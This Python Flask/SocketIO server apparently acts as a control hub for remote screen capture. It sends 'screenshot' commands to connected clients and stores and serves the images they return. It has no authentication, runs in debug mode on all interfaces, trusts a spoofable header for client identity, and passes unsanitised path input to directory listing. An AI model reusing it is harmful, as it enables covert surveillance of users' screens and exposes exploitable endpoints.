import base64
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_socketio import SocketIO
import os

app = Flask(__name__)
socketio = SocketIO(app)
clients = {}


def emit_command_to_client(ip, command):
    for sid, client_ip in clients.items():
        if client_ip == ip:
            socketio.emit('command', {'command': command}, room=sid)
            return jsonify({'status': 'success', 'message': f'Command {command} sent to client {ip}.'}), 200
    return jsonify({'status': 'error', 'message': f'Client {ip} not found.'}), 200


@app.route('/api/v1/command', methods=['POST'])
def handle_command():
    command_data = request.get_json()
    command = command_data.get('command')
    ip = command_data.get('ip')

    if command == 'screenshot':
        return emit_command_to_client(ip, command)
    return jsonify({'status': 'error', 'message': 'Unrecognized command.'}), 400


@app.route('/api/v1/clients', methods=['GET'])
def get_clients():
    clients_info = [{'name': f'Client {i + 1}', 'ip': ip} for i, ip in enumerate(clients.values())]
    return jsonify({'status': 'success', 'clients': clients_info}), 200


def list_screenshots(directory):
    return [f"{directory}/{file}" for file in os.listdir(directory) if os.path.isfile(os.path.join(directory, file))]


@app.route('/api/v1/screenshot', methods=['GET'])
def get_screenshots():
    screenshots = [screenshot for client_ip in clients.values() for screenshot in
                   list_screenshots(f"screenshots/{client_ip}")]
    return jsonify({'status': 'success', 'screenshots': screenshots}), 200


@app.route('/api/v1/screenshot/<ip>', methods=['GET'])
def get_screenshots_by_ip(ip):
    screenshots = list_screenshots(f"screenshots/{ip}")
    return jsonify({'status': 'success', 'screenshots': screenshots}), 200


@app.route('/api/v1/screenshot/<ip>/<screenshot>', methods=['GET'])
def get_screenshot(ip, screenshot):
    screenshot_path = f"screenshots/{ip}/{screenshot}"
    if os.path.exists(screenshot_path):
        return send_from_directory('screenshots', f"{ip}/{screenshot}")
    else:
        return jsonify({'status': 'error', 'message': 'Capture d\'écran non trouvée.'}), 404


@socketio.on('connect')
def handle_connect():
    clients[request.sid] = request.headers.get('X-Forwarded-For', request.remote_addr)


@socketio.on('screenshot_response')
def handle_screenshot(data):
    screenshot_bytes = base64.b64decode(data.get('screenshot'))
    client_ip = clients.get(request.sid)
    screenshot_dir = f"screenshots/{client_ip}"
    os.makedirs(screenshot_dir, exist_ok=True)
    screenshot_path = f"{screenshot_dir}/{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
    with open(screenshot_path, 'wb') as f:
        f.write(screenshot_bytes)


@socketio.on('disconnect')
def handle_disconnect():
    clients.pop(request.sid, None)


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
